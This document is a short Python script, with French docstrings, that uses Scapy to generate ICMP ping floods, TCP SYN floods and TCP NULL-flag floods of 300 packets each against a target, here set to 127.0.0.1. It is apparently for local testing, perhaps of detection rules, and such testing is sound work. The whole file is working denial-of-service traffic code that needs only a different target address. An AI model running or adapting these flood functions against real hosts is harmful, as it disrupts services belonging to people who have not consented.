from scapy.all import IP, ICMP, TCP, send
import time

def send_icmp_flood(target, count=300):
    """Envoie un flood de paquets ICMP (Ping flood) vers la cible."""
    for i in range(count):
        packet = IP(dst=target)/ICMP()
        send(packet, verbose=False)
        time.sleep(0.01)  

def send_syn_flood(target, count=300):
    """Envoie un flood de paquets SYN vers la cible."""
    for i in range(count):
        packet = IP(dst=target)/TCP(dport=80, flags='S')
        send(packet, verbose=False)
        time.sleep(0.01)  

def send_null_flood(target, count=300):
    """Envoie un flood de paquets NULL vers la cible."""
    for i in range(count):
        packet = IP(dst=target)/TCP(dport=80, flags=0) 
        send(packet, verbose=False)
        time.sleep(0.01)
if __name__ == "__main__":

    target = "127.0.0.1"

    print(f"envoi de icmp vers {target}...")
    send_icmp_flood(target)
    
    print(f" paquets SYN vers {target}...")
    send_syn_flood(target)

    print(f"paquets NULL vers {target}...")
    send_null_flood(target)

